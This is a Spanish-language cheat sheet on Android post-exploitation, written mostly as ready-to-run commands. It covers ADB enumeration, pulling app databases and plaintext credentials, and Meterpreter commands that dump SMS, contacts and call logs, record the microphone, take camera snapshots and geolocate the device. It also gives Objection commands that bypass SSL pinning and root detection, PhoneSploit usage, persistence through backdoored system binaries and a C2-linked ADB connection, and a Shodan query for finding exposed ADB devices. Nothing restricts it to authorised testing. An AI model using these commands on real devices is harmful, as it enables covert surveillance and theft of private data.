# Post-explotación_Android

---

Post‑explotación en Android

Cuando se obtiene acceso a un dispositivo Android (mediante un payload, ADB, o una app maliciosa), la prioridad es enumerar el sistema, extraer datos sensibles y mantener la persistencia. El acceso puede ser mediante adb shell, una shell remota de Meterpreter o una sesión interactiva con herramientas como objection.
1. Enumeración básica del sistema
Comando	Propósito
adb devices -l	Verificar conexión y obtener modelo del dispositivo
adb shell getprop ro.build.fingerprint	Obtener el build fingerprint completo del sistema
adb shell getprop ro.product.model	Modelo exacto del dispositivo
adb shell getprop ro.build.version.security_patch	Crítico: Fecha del último parche de seguridad
adb shell getprop ro.build.version.sdk	Nivel de API (Android version)
adb shell pm list packages	Listar todos los paquetes instalados
adb shell pm list packages -3	Solo aplicaciones de terceros (no del sistema)
adb shell dumpsys battery	Información de batería (útil para verificar si el dispositivo está en uso)
adb shell dumpsys package <package>	Información detallada de una app específica
adb shell netstat -tunlp	Conexiones de red activas y puertos escuchando
2. Enumeración de archivos y datos en disco

Los datos de las aplicaciones se almacenan en /data/data/:
bash

adb shell su -c "ls -la /data/data/"

Archivos de interés:
Ruta	Contenido
/data/data/<package>/shared_prefs/*.xml	SharedPreferences (credenciales en texto plano a menudo)
/data/data/<package>/databases/*.db	Bases de datos SQLite de la app
/data/data/<package>/files/	Archivos internos de la app (logs, temporal, etc.)
/data/local/tmp/	Directorio temporal escribible
/storage/emulated/0/	Almacenamiento externo (fotos, descargas, etc.)
/sdcard/	Enlace a almacenamiento externo
3. Herramientas de post‑explotación para Android
ADB (Android Debug Bridge)

El punto de entrada más común cuando el dispositivo tiene depuración USB habilitada:
bash

# Conectar a dispositivo remoto por red
adb connect 192.168.1.100:5555

# Abrir shell interactiva
adb shell

# Subir archivos al dispositivo
adb push herramienta.sh /data/local/tmp/

# Descargar archivos desde el dispositivo
adb pull /data/data/com.app/databases/app.db .

# Ejecutar comandos como root (si el dispositivo está rooteado)
adb shell su -c "comando"

Meterpreter (Metasploit)

Si has desplegado un payload android/meterpreter/reverse_tcp, puedes usar comandos específicos:
Comando Meterpreter	Descripción
sysinfo	Versión de Android, modelo, etc.
getuid	Usuario bajo el que corre el payload
dump_calllog	Extrae el historial de llamadas
dump_sms	Extrae todos los SMS del dispositivo
webcam_snap	Toma una foto con la cámara frontal
record_mic	Graba audio del micrófono
dump_contacts	Extrae la libreta de direcciones
geolocate	Obtiene la ubicación GPS actual
Objection (Runtime Mobile Exploration)

Objection, potenciado por Frida, permite explorar apps en tiempo real sin necesidad de root en muchos casos:
bash

# Conectar a una app específica (por nombre o PID)
objection -g com.example.app explore

# Dentro de la sesión de objection:
env                              # Ver rutas de almacenamiento de la app[reference:16]
android sslpinning disable       # Bypass de SSL pinning[reference:17]
android keystore list            # Listar elementos del keystore[reference:18]
android root disable             # Intentar bypassear detección de root[reference:19]
file download /data/data/...     # Descargar archivos desde el dispositivo
android intent launch_activity   # Lanzar actividades exportadas

drozer

Framework completo para interactuar con el runtime de Android:
bash

# Listar paquetes que coinciden con un patrón
run app.package.list -f keyword

# Analizar superficie de ataque de una app
run app.package.attacksurface <package>

# Listar actividades exportadas
run app.activity.info -a <package>

# Lanzar una actividad exportada
run app.activity.start --component <package> <component name>[reference:20]

PhoneSploit

Automatiza la explotación de dispositivos con puerto ADB abierto expuesto en red:
bash

git clone https://github.com/metachar/PhoneSploit.git
cd PhoneSploit
python3 main_linux.py

# Menú interactivo con opciones como:
# - Acceder a shell del dispositivo
# - Instalar APK
# - Capturar pantalla
# - Grabar pantalla
# - Listar aplicaciones
# - Transmitir archivos

4. Extracción de datos sensibles
SharedPreferences (archivos XML)
bash

adb shell su -c "cat /data/data/<package>/shared_prefs/*.xml"

Ejemplo de salida con credenciales en claro:
xml

<string name="user">testuser</string>
<string name="password">testpass</string>

Bases de datos SQLite
bash

adb shell su -c "sqlite3 /data/data/<package>/databases/nombre.db"
sqlite> .tables
sqlite> SELECT * FROM tabla;

Archivos temporales
bash

adb shell su -c "ls -la /data/data/<package>/"
adb shell su -c "cat /data/data/<package>/uinfo*.tmp"

Logs de aplicaciones
bash

adb logcat | grep -i "password\|token\|apikey"

5. Persistencia en Android
Método	Descripción
APK en partición del sistema	Instalar APK malicioso en /system/priv-app/ (requiere root)
Servicio en segundo plano	Crear un Service que se ejecute al arrancar el dispositivo
Reemplazar binario del sistema	Modificar /system/bin/ para incluir backdoor
Autostart via STARTUP intent	Escuchar BOOT_COMPLETED en el AndroidManifest.xml
Abusar de ADB persistente	Mantener ADB habilitado y conectado a un C2

Nota: La persistencia requiere permisos elevados (root o acceso a la partición del sistema).
6. Consideraciones adicionales

    Dispositivos rooteados: Habilitan acceso completo a /data/data/ y /system/. Herramientas como Magisk pueden ocultar el root.

    Dispositivos no rooteados: Objection mediante repackaging del APK o frida-server puede ofrecer capacidades limitadas, especialmente útil para bypass de SSL pinning.

    Shodan para encontrar ADB expuestos: Buscar "Android Debug Bridge" product:"Android Debug Bridge" en Shodan para encontrar dispositivos con ADB abierto en Internet.

